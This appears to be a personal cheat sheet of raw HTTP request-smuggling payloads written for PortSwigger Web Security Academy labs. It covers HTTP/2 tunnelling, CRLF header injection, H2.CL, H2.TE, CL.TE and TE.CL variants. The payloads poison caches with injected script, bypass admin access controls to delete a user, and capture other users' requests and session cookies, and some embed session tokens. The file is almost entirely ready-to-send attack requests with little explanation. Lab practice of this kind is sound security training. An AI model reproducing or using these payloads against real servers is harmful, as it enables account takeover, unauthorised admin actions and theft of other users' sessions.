# Web cache poisoning via HTTP2 request tunnelling
name:
:path

value:
/ HTTP/1.1
Host: acbf1fef1e4fed6ec0bf6ef7000b006a.web-security-academy.net

GET /resources?<script>alert(1)</script>foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890Vfoobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890Vfoobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890foobar1234567890 HTTP/1.1
Foo: bar

# Bypassing access controls via HTTP/2 request tunnelling

#  leakage payload
name:
foo: bar
Content-Length: 115

search=x


value:
xuy

# admin payload:
name:
foo:bar

GET /admin/delete?username=carlos HTTP/1.1
X-SSL-VERIFIED: 1
X-SSL-CLIENT-CN: administrator
X-FRONTEND-KEY: 3391277118436530

value:
xuy

# delete carlos:
name:
foo:bar

GET /admin/delete?username=carlos HTTP/1.1
X-SSL-VERIFIED: 1
X-SSL-CLIENT-CN: administrator
X-FRONTEND-KEY: 3391277118436530

value:
xuy


# request splitting via CRLF injection
# inside http2 header:
name:
x 

Value:
break here

GET /404 HTTP/1.1
Host: aca11f101e26b91ec04c41f1002700cd.web-security-academy.net


# H2.TE queue poisoning

POST /x HTTP/2
Host: ac741fef1ecbb9b6c08a249d00ed001b.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: ac741fef1ecbb9b6c08a249d00ed001b.web-security-academy.net


# H2.TE using CRLF

POST / HTTP/2
Host: acec1ffb1ef20ceac097a6f300b50082.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
X: bs$Transfer-Encoding: chunked # $ = CRLF
Content-Length: 541

0

POST /post/comment HTTP/1.1
Host: acec1ffb1ef20ceac097a6f300b50082.web-security-academy.net
Cookie: session=YiFWOusmxqoDwar9NZqRa5SRACXiE8kH; _lab_analytics=k2hEpEMnh7FOlL08tsdU6yMrH5vH786oPccuLkKph1zM68i5HmMENqjtlS6uDn6yd0rQpCKxt2RJqeOveudPh9abuI3oC7uswrYWtOQXGddomfVqNjbuoVjGxQa74PeWlEHZyRaNSqdarVtob9Vy9TIP4yogrPFHLLSeNKaASTKlFzvfvG5QyoGoq4mNqPtebBx7mdtQW6IePy0Vx5uDp5kFRohfrg6COqR5S7YJAn6WsZXZ8EWdRcNi6fmpyvu4
Content-Length: 1050


csrf=voFPOhHSY6nNJgKCxH4V10pzV0Zjx2ik&postId=4&name=dd&email=admin@dmin.min&website=&comment=




# H2.CL request smuggling

POST / HTTP/2
Host: acee1fff1f18c42dc0510c2d00ab00fd.web-security-academy.net
Content-Length: 0


GET /resources HTTP/1.1
Host: exploit-ac2e1f281f3ec410c0430c8601f40002.web-security-academy.net
Content-Length: 5


x=1

# CL.TE CachDeceptn

POST / HTTP/1.1
Host: acde1f821f1afb5ec028f00500350099.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Transfer-Encoding: chunked

0


GET /my-account HTTP/1.1
X-Ignore: X

# Victim-sim

GET /resources/js/tracking.js HTTP/1.1
Host: acde1f821f1afb5ec028f00500350099.web-security-academy.net
Connection: keep-alive

# ======


# xxs-test

GET /post?postId=4 HTTP/1.1
Host: ac921f5f1ecc9e31c0fc4e600043000a.web-security-academy.net
Cookie: session=n10QJWvUWpZaTBuS6R2BlN4uE99NwP8t
User-Agent: "><script>alert("test: xss is working")</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Referer: https://ac921f5f1ecc9e31c0fc4e600043000a.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Te: trailers
Connection: close



# CL.TE XSS

POST / HTTP/1.1
Host: ac921f5f1ecc9e31c0fc4e600043000a.web-security-academy.net
Cookie: session=n10QJWvUWpZaTBuS6R2BlN4uE99NwP8t
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 144
Transfer-Encoding: chunked

0


GET /post?postId=6 HTTP/1.1
Host: ac921f5f1ecc9e31c0fc4e600043000a.web-security-academy.net
User-Agent: ">http://burpsuite/repeat/37/sa4enoczhvngtl66ydx6pep3dtmpp8gx<script>alert(1)</script>
x:

# ======


# eXpolit CL.TE


GET /admin HTTP/1.1
Host: acaa1fde1fa8b3bac0cb855100b50051.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 0


# =====

# CL.TE CachPoisn

POST / HTTP/1.1
Host: ac281fc71f89bf7ac0980d6a00500011.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 197
Transfer-Encoding: chunked

0


GET /post/next?postId=4 HTTP/1.1
Host: exploit-acff1fb51f72bf78c0560d1201d200e2.web-security-academy.net/
Content-Type: application/x-www-form-urlencoded
Content-Length: 10


X=1


# ====

CL:TE w/Header

POST / HTTP/1.1
Host: acf71f8a1f345eddc0000f56001f0021.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 783
Transfer-Encoding: chunked

0
POST /post/comment HTTP/1.1
Host: ac1c1f721ebd30e9c0541639006c0008.web-security-academy.net
Cookie: session=0BuWWqgFxPjVqGHNwSzsLPaiO3EspVVi
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Connection: keep-alive

csrf=qTJKlDhPrsaejyG75wXWWpUN8chxgI9v&postId=6&name=rrr&email=admin%40admin.min&website=&comment=test1POST /post/comment HTTP/1.1
Host: ac001f691eefa296c06906df006100eb.web-security-academy.net
Cookie: session=E2UEMjsoaOROqMNNacONYRfeHSu72oO1
Content-Type: application/x-www-form-urlencoded
Content-Length: 850

csrf=3YiinGWwJFKC23Odz76V3PtjQGjNmQLJ&postId=8&name=carlos&email=carlos%40carlo.com&website=&comment=ddd
POST / HTTP/1.1
Host: acf71f8a1f345eddc0000f56001f0021.web-security-academy.net
Cookie: session=m4e6JihcaYRcW5PC16lXj0tX8cgztgux
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 250
Origin: https://acf71f8a1f345eddc0000f56001f0021.web-security-academy.net
Dnt: 1
Referer: https://acf71f8a1f345eddc0000f56001f0021.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Te: trailers
Connection: close

search=

# TE:CL Payload

POST / HTTP/1.1
Host: acd71f9d1f4b2cc9c03068760067007d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked

45
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost





0

# ======


# CL:TE Payload


POST / HTTP/1.1
Host: ac1f1f0a1f8b5802c0dd261b00c800f3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 68
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost


====

# CL.TE Post Xploit

POST / HTTP/1.1
Host: ac001f691eefa296c06906df006100eb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 322
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac001f691eefa296c06906df006100eb.web-security-academy.net
Cookie: session=E2UEMjsoaOROqMNNacONYRfeHSu72oO1
Content-Type: application/x-www-form-urlencoded
Content-Length: 835

csrf=3YiinGWwJFKC23Odz76V3PtjQGjNmQLJ&postId=8&name=carlos&email=carlos%40carlo.com&website=&comment=



====

# vicsim

GET /my-account HTTP/1.1
X-zimbur: NOGET /my-account HTTP/1.1
Host: acde1f821f1afb5ec028f00500350099.web-security-academy.net
Cookie: session=pcjtCreKAJsw0zSatysVhGpr0UxjypnX
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acde1f821f1afb5ec028f00500350099.web-security-academy.net/login
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Te: trailers
Connection: close

=====

# CL.TE - breaker

POST / HTTP/1.1
Host: ac491f8c1fc99226c06d5636006b004f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x